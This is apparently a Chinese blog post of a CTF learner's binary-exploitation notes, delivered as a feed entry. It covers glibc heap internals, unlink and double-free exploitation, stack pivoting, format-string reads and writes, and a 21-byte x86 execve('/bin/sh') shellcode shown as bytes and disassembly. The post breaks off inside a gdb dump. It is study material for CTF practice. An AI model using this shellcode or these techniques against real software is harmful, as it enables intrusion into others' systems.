      <url>/2018/01/20/pwn-trick/</url>
      <content type="html"><![CDATA[<p>今天学pwn…希望能坚持…现在还没有什么trick, 就当一个备忘的板子</p>
<h3 id="ROPGadget里的only"><a href="#ROPGadget里的only" class="headerlink" title="ROPGadget里的only"></a>ROPGadget里的only</h3><p>坑爹啊…铁三的时候用这个<code>--only &#39;int&#39;</code>…只能找到一个<code>int 0x80</code><br>然后碰巧这题里…这个gadget最低位是坏字符用不了…<br>现在才发现,,,,不加这玩意, 随便<code>| grep &#39;int 0x80&#39;</code>能得到一堆…<br>伤…<br>我特么</p>
<h3 id="21字节shellcode"><a href="#21字节shellcode" class="headerlink" title="21字节shellcode"></a>21字节shellcode</h3><p>应该是x86通用的?</p>
<pre class="line-numbers language-python"><code class="language-python">shellcode  <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x0b\xcd\x80"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-asm"><code class="language-asm">   0:   31 c9                   xor    ecx,ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   ecx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   68 2f 62 69 6e          push   0x6e69622f
   f:   89 e3                   mov    ebx,esp
  11:   b0 0b                   mov    al,0xb
  13:   cd 80                   int    0x80
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="更改执行流程"><a href="#更改执行流程" class="headerlink" title="更改执行流程"></a>更改执行流程</h3><p>栈溢出, 覆盖返回地址</p>
<p>更改got表, 有的题目是静态链接或者开启<code>full RELRO</code>保护不能写GOT的时候就可以考虑使用malloc_hook</p>
<p>使用malloc_hook, 这个刚刚学到, 在RCTF2017-RNote里, 这题有点神奇, 错位分配fastbin到malloc_hook</p>
<h4 id="emmmm"><a href="#emmmm" class="headerlink" title="emmmm"></a>emmmm</h4><p>有个疑问, 就是静态链接到底可以改got表来劫持流程吗…</p>
<h3 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h3><p>prev是指低地址的, 我智商太低老是反映不过来<br>比如, free的时候, 合并到低地址的空闲chunk是如下操作</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    prevsize <span class="token operator">=</span> <span class="token function">prev_size</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>
    p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>------------------ &lt;- 低地址
prev_size | size
------------------ 
fd      |    bk
------------------ 
not used content
------------------ &lt;- p
prev_size | size
-----------------
Data
-----------------

变成

------------------ &lt;- p
prev_size | size
------------------ 
fd      |    bk
------------------ 
not used content
------------------ &lt;- 原来p的指向

-----------------

-----------------
</code></pre><h3 id="利用leave伪造栈帧"><a href="#利用leave伪造栈帧" class="headerlink" title="利用leave伪造栈帧"></a>利用leave伪造栈帧</h3><pre class="line-numbers language-asm"><code class="language-asm">push ebp
mov  ebp, esp

leave # mov esp, ebp | pop ebp
ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个leave可以改变esp的值, 所以只要伪造一个ebp, 然后跳到一个leave的片段就可以</p>
<pre><code>旧的栈帧
-----------------------------
padding | fake ebp | ret_addr
                        +
                        +--&gt; leave | ret ----------------+
                                +----&gt; esp = fake ebp    |
            +---------------------------+  pop ebp       |
            |                        +---------+         |
            +                        |                   |
伪造的栈帧 esp(原fake ebp)           |     | ret_addr &lt;--+
-------------------------------------+-----+----------
fake ebp2(上一句的leave的后半句要pop ebp)  | fake addr
</code></pre><p>把这里的ret_addr设置为<code>leave; ret</code>的gadget的地址<br>当执行leave这一句的时候, 当前的esp就变为了我们设置的<code>fake ebp</code>, 这个时候下一句的ret就是从我们当前的esp处(我们前面的fake的ebp地址)弹出的地址作为返回地址了, 所以我们还要提前在<code>fake ebp</code>这里写好, 这里就需要我们能有一块知道地址并且可写的地址来放我们的<code>fake ebp</code>指向的区域</p>
<p>应该是适用于那种栈溢出能利用的字节比较少的时候, 对…做了几道题, 发现…这原来叫栈迁移…就一般只能覆盖到ebp和ret的时候可以用这个技巧</p>
<h3 id="libc-csu-init处的gadget"><a href="#libc-csu-init处的gadget" class="headerlink" title="libc_csu_init处的gadget"></a>libc_csu_init处的gadget</h3><p>可以控制大量的寄存器, 常用于64位rop…然后顺手牵一段代码</p>
<h3 id="MK-FP"><a href="#MK-FP" class="headerlink" title="MK_FP"></a>MK_FP</h3><p>一般你看到的MK_FP是用来实现Canary的<br>ida里类似的代码</p>
<pre class="line-numbers language-c"><code class="language-c">v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="堆方向大概是这样子的"><a href="#堆方向大概是这样子的" class="headerlink" title="堆方向大概是这样子的"></a>堆方向大概是这样子的</h3><pre><code>+--------------+ 高
+  top chunk   |
+--------------+
+ size of top  |
+--------------+
+ prev size    |
+--------------+
+--------------+
+ chunk0       |
+--------------+
+size of chunk0|
+--------------+
+ prev size    |
+ -------------+ 低
</code></pre><h3 id="实际堆块大小"><a href="#实际堆块大小" class="headerlink" title="实际堆块大小"></a>实际堆块大小</h3><p>以32为例, <code>malloc(size)</code>, 这里是说至少能放得下size大小的data, 那么实际割下来一块<code>((size + 4 + 7) &amp; ~7)</code><br>先说这里的 <code>(size + 4)</code> 这一部分, 因为需要8bit的<code>meta</code>信息, 而又可以使用下一块的4bit的<code>prev_size</code>, 所以元信息只要额外的4bit</p>
<pre><code>----------+-----
prev_size | 4bit
----------+-----
size      | 4bit
----------+-----
chunk     | ?bit
----------+-----
人家的prev_size
----------+-----
</code></pre><p>再说这里的<code>((x + 7) &amp; ~7)</code>, 这个是为了8字节对齐, 明眼人一下就看出来这是个分段函数<br><code>x = 1...8</code>时候<code>f(x) = 8</code>, <code>x = 9...16</code>的时候<code>f(x) = 16</code>, 恩, 就这样子</p>
<p>另外, 32位以8字节对齐, 那64位应该是16字节对齐的?所以就是<code>((size + 8 + 15) &amp; ~15)</code>, ???</p>
<p>对的, 是双字对齐<code>double-word aligned</code></p>
<p>后来, 在读malloc源码的时候看到了…<br>具体对齐的代码是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>本来是需要两个额外的size_t来存储头部信息, 但由于可以借用下一个chunk的<code>prev_size</code>, 所以这里只要加一个size_t, 如果是mmap申请的, 就没有办法借用…就需要加<code>2*size_t</code>, 然后再对齐</p>
<h3 id="fast-bin-大小"><a href="#fast-bin-大小" class="headerlink" title="fast bin 大小"></a>fast bin 大小</h3><p>16~64(0x10, 0x40) bytes for x86_32<br>32~128(0x20, 0x80) bytes for x86_64<br>这个大小应该指的是data的大小, 还是总共分的大小<br>这个data是chunk的大小, 不是data的大小</p>
<p>根据上面的计算公式, 这个, 那个32bit下…malloc 大小0x0和0x8的..会得到一个0x10大小的chunk, 也就是最小的chunk</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x10</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x10</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x18</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x20</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x28</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x30</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x38</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">-></span> free <span class="token operator">-></span> fastbinY<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x40</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实际上这个fastbinY是有10个位置…fastbinY[0..9], 意思是后三个[7..9], 其实是没用上的, 这个可能通过设置来实现?</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对应fastbinY差不多…是这样子的</p>
<pre><code>fastbinY[0] -&gt; &#39;p3&#39; -&gt; &#39;p2&#39; -&gt; &#39;p1&#39; -&gt; NULL
</code></pre><p>等再分配的时候, 会把<code>p3</code>先unlink出去, 然后是<code>p2</code>, <code>p1</code><br>相当于是栈, LIFO, 但怎么感觉哪里怪怪的…这个栈顶在<code>fastbinY[?]</code></p>
<p>而对于普通的bins, 是这样子</p>
<pre><code>bins[0] -&gt; 0x604940 -&gt; 0x604820
           后入后出    先入先出
</code></pre><p>进入的方向和fastbins是一样的, 但出去的方向是不一样的</p>
<p>普通的bin有很多…大概是…126 这么多…而且bins是双向链表, 一个位要占两个格子</p>
<pre><code>1 unsorted bin
62 small bin
63 large bin
</code></pre><p>那我怎么感觉, 调试的时候在最后一个bins和binmap时间有8字节的padding呢…</p>
<h3 id="FIFO-amp-LIFO"><a href="#FIFO-amp-LIFO" class="headerlink" title="FIFO &amp; LIFO"></a>FIFO &amp; LIFO</h3><p>fastbins是先进后出, 像栈一样<br>其他的bins都是先进先出, 像队列一样</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>FULL RELRO之后就不能改写got表了</p>
<h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><p>UAF 用来leak堆上的信息, 然后计算一些地址</p>
<p>double free用来利用unlink漏洞(以前glibc的unlink没有检查, 只需要一次free就可以利用了) 看到某人写到double free的核心在于第二次free的时候发生的unlink, 虽然叫double free, 但其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞, 我觉得看了很多还是这一篇讲述的清楚 <a href="http://www.cnblogs.com/elvirangel/p/7203540.html" target="_blank" rel="external">http://www.cnblogs.com/elvirangel/p/7203540.html</a></p>
<p>注意了…bins里的size字段存储的是<code>prev_size + size + data</code>的长度, 不是data的长度, 只有这样子才能通过size字段来找到下一块啊….</p>
<h3 id="新的unlink的利用方法-传说中的unlink"><a href="#新的unlink的利用方法-传说中的unlink" class="headerlink" title="新的unlink的利用方法(传说中的unlink)"></a>新的unlink的利用方法(传说中的unlink)</h3><pre><code>|&lt;-------------------p1-------------------------&gt;|&lt;-----p2------&gt;
+-----------+------+-----------------------------+----------------+
| prev_size | size |fake_prev|fake_size|fake_data|prev|size|data  |
+-----------+------+-----------------------------+----------------+
                   |&lt;-----fake出来的堆块--------&gt;|&lt;-溢出时fake一下|
</code></pre><p>通过p1的堆溢出来在p1的数据部分fake一个堆, 同时对p2的下一块的prev(改成fake出来堆块的大小)和size(主要是标志位)进行修改, 让系统以为p1已经空闲, 然后在<code>free(p2)</code>的时候就可以对p1进行unlink, 这个时候就要注意fake出来的堆块的构造方式, 主要是fake_fd和fake_bk….</p>
<p>Unlink有很多中利用方式, 就是有不同的构造方式, 这里是用overflow的方法, 也可以用overlap的方法, 强网杯补题里有说..</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>double free的经典题目<code>0ctf2015-freenote</code>的wp很多, 但我感觉这一篇真棒, 有图真好, <a href="http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up" target="_blank" rel="external">http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up</a><br><a href="http://rk700.github.io/2015/04/21/0ctf-freenote/" target="_blank" rel="external">http://rk700.github.io/2015/04/21/0ctf-freenote/</a></p>
<h3 id="总觉UAF和double-free哪里很像"><a href="#总觉UAF和double-free哪里很像" class="headerlink" title="总觉UAF和double free哪里很像"></a>总觉UAF和double free哪里很像</h3><p>问题终结…<br>在某大佬的PPT里说…<br>Double Free算是一种特殊的UAF</p>
<h3 id="很多天了-没搞清楚这个unlink的double-free"><a href="#很多天了-没搞清楚这个unlink的double-free" class="headerlink" title="很多天了, 没搞清楚这个unlink的double free"></a>很多天了, 没搞清楚这个unlink的double free</h3><p>在unlink一个块, 我们叫他<code>p = 0x604800</code>的时候是(64位为例)<br>用方块代表取一个地址里的东西</p>
<pre><code>BK = p -&gt; bk
   BK = [0x604800 + 0x18] = 0x604900
FD = p -&gt; fd
   FD = [0x604800 + 0x10] = 0x604700
然后
BK -&gt; fd = FD -&gt; bk
   [0x604700 + 0x18] = [0x604900 + 0x10] 
   [0x604900 + 0x10] = [0x604700 + 0x18]
</code></pre><p>我已经崩坏了….</p>
<p>double link的时候, ptr是找到一个地址指向我们要unlink的块, 而不是 <code>ptr == p</code>. 是<code>*ptr == p</code>,(p是我们unlink的时候要释放的fake出来的块), 理解错误之一<br>unlink的时候这个会发生一次赋值<del><code>ptr = p - 0x18</code></del>, 这里是我理解的最大错误之二, 应该是<code>*ptr = ptr - 3</code><br>然后如果能对ptr里存的地址所指向的位置进行写的话, 就可以写到<code>ptr - 3</code>的地方<br>现在才懂这个图是啥意思 <a href="http://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6195919.html</a><br>然后对 <code>note[0] -&gt; content</code> (我们上面的ptr)进行写入的话, 其实就是写到了<code>ptr - 0xc</code>这个地址, 因为<code>ptr - 0x18</code>这个地址位于<code>ptr</code>的上方, 所以这样子就能重新覆盖掉ptr, 比如把ptr里的内容覆盖成<code>free@got</code>,<br>我怕是个傻子</p>
<p>妈的, 终于懂了</p>
<h3 id="贴一篇关于堆-感觉挺好的"><a href="#贴一篇关于堆-感觉挺好的" class="headerlink" title="贴一篇关于堆, 感觉挺好的"></a>贴一篇关于堆, 感觉挺好的</h3><p><a href="https://paper.seebug.org/255/" target="_blank" rel="external">https://paper.seebug.org/255/</a></p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>看这个 <a href="https://paper.seebug.org/246/" target="_blank" rel="external">https://paper.seebug.org/246/</a><br>当格式化字符串存储在bss, 堆上的时候怎么办<br>当格式化字符串使用不同函数接收时候的字符限制<br>当开启保护不能改got表怎么办 -&gt; 改stdin虚表</p>
<h3 id="有的时候不能想当然"><a href="#有的时候不能想当然" class="headerlink" title="有的时候不能想当然"></a>有的时候不能想当然</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我看到这个的时候一般认为, 局部变量a应该是先进行分配, 所以处于更高的位置, buffer位于低一些的位置, 更靠近func2的调用堆栈, 其实呢, 编译发现…gcc可能会对局部变量的位置进行调整, 就像这里, 我看到的是 buffer 更高, 所以不能YY, 要自己看编译后的结果…毕竟不知道编译的时候gcc对程序做了什么优化对齐啊什么什么的</p>
<h3 id="这样子一段"><a href="#这样子一段" class="headerlink" title="这样子一段"></a>这样子一段</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>对这个setvbuf还是不太懂<br>后来…偶然调试了一下…<br>如果不setbuf的话…在用printf, scanf输入输出的时候会在堆上申请内存来作为输入输出缓冲区<br>调试发现, 第一次用printf会产生一个0x400(1024)大小的缓冲区, 如果加上<code>setvbuf(stdout, 0, 2, 0)</code>就不会产生这个缓冲区<br>scanf同理, 也会产生一个<br>那么如果取消缓冲区的话….那他们怎么缓冲呢QwQ</p>
<h3 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>test使用<code>AAAA.%1$p.%2$p...</code>这样子的</p>
<h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>确定位置之后,比如是<code>%3$p</code>, 使用<code>addr.%3$s</code>来任意地址读…我这里写了个题, 利用格式化字符串来DynELF…结果失败了,QAQ, 不知道为啥</p>
<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>可以用pwntools带的fmtstr_payload…</p>
<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p><a href="https://paper.seebug.org/246/" target="_blank" rel="external">https://paper.seebug.org/246/</a></p>
<h3 id="IDA相关"><a href="#IDA相关" class="headerlink" title="IDA相关"></a>IDA相关</h3><p>就写在这里吧…<br>IDA栈帧表示</p>
<pre><code>-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
</code></pre><p>这个s是saved的ebp, r是返回地址ret</p>
<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>经常用的</p>
<pre class="line-numbers language-python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc32"</span><span class="token punctuation">)</span>
list<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 写法一</span>
libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 写法二</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个<code>libc.search()</code> 返回的就是一个<code>generator</code>, 大概用法</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> x
        x <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true"># 用法1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> gen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    do sth<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment" spellcheck="true"># 用法1</span>
g <span class="token operator">=</span> gen<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> g<span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> g<span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> g<span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>因为fastbin是单链表, 所以要其他bin才能leak出main_area, 从而算出来libc地址</p>
<h3 id="bins-0"><a href="#bins-0" class="headerlink" title="bins[0]"></a>bins[0]</h3><p><code>bins[0]</code>貌似是没有意义的…</p>
<p>因为在<code>malloc_init_state</code>中…这样子写道</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">malloc_init_state</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    mbinptr bin<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Establish circular links for normal bins */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NBINS<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bin<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token operator">-></span>bk <span class="token operator">=</span> bin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的<code>bin_at</code>是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* addressing -- note that bin_at(0) does not exist */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> bin_at(m, i) \
  (mbinptr) (((char *) &amp;((m)->bins[((i) - 1) * 2]))                              \
             - offsetof (struct malloc_chunk, fd))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>喔…不对…我的理解好像出现了偏差…</p>
<h3 id="mem-chunk"><a href="#mem-chunk" class="headerlink" title="mem chunk"></a>mem chunk</h3><p>malloc里把malloc和free的的指针, 称mem, 即不包含chunk的头部的<code>prev_size</code>和<code>size</code><br>在进入<code>__libc_free</code>时, 会把传入的<code>mem</code>用<code>mem2chunk</code>转为<code>chunk</code><br>其中, <code>mem2chunk</code>是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>对应的<code>chunk2mem</code>为</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="关于初始化"><a href="#关于初始化" class="headerlink" title="关于初始化"></a>关于初始化</h3><p>初始化之后…<br>fastbinsY[0…9] 都为 0<br>bins  并不是为0, 而是会指向自身, 所以是是可以通过这个leak出main_area的地址</p>
<pre class="line-numbers language-python"><code class="language-python">gdb<span class="token operator">-</span>peda$ p main_arena 
$<span class="token number">1</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  mutex <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  flags <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">,</span> 
  fastbinsY <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
  top <span class="token operator">=</span> <span class="token number">0x804b070</span><span class="token punctuation">,</span> 
  last_remainder <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
